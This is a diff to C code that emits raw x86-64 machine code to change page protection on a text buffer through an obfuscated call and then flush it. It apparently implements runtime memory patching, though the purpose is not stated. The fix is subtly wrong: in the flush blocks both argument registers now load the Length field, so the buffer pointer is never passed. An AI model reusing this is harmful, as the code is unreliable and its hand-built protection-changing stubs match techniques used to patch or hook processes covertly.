@@ -59,10 +59,10 @@ typedef struct {
 #define BW_MAX_BLOCKS 128
 
 typedef struct {
-	unsigned char * Buffer;
-	unsigned long   Length;
-	unsigned long   MaximumLength;
-} BW_USTRING;
+	unsigned long   Length;          /* USTRING is ANSI_STRING-shaped:     */
+	unsigned long   MaximumLength;   /* {len, max, buf} - the first cut    */
+	unsigned char * Buffer;          /* shipped {buf,len,max} and sf032    */
+} BW_USTRING;                        /* dereferenced the length as a ptr   */
 
 #ifndef NTSTATUS
 #define NTSTATUS LONG
@@ -429,9 +429,9 @@ static BOOL bw_build_pages(void)
 	e += 4;
 	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
 	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x50;            /* mov rcx,[rax+0x50] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] u_text.Buffer */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
 	e += 4;
 	e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,4 (PAGE_READWRITE) */
 	e += 6;
@@ -480,9 +480,9 @@ static BOOL bw_build_pages(void)
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x50;            /* mov rcx,[rax+0x50] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] u_text.Buffer */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
 	e += 4;
 	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] */
 	e = bw_put32(e + 3, 0x74);
@@ -492,9 +492,9 @@ static BOOL bw_build_pages(void)
 	e += 3;
 	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
 	e += 7;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
 	e += 4;
-	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov r8,[rax+0x58] */
+	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov r8,[rax+0x50] u_text.Length */
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x90;                                        /* call [rax+0x80] flush */
 	e = bw_put32(e + 2, 0x80);
@@ -528,9 +528,9 @@ static BOOL bw_build_pages(void)
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x50; e[2] = 0x18;                          /* call sf032 */
 	e += 3;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x50;            /* mov rcx,[rax+0x50] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] u_text.Buffer */
 	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
 	e += 4;
 	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] */
 	e = bw_put32(e + 3, 0x74);
@@ -540,9 +540,9 @@ static BOOL bw_build_pages(void)
 	e += 3;
 	e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
 	e += 7;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] */
+	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov rdx,[rax+0x50] u_text.Length */
 	e += 4;
-	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov r8,[rax+0x58] */
+	e[0] = 0x4C; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x50;            /* mov r8,[rax+0x50] u_text.Length */
 	e += 4;
 	e[0] = 0xFF; e[1] = 0x90;                                        /* call flush */
 	e = bw_put32(e + 2, 0x80);
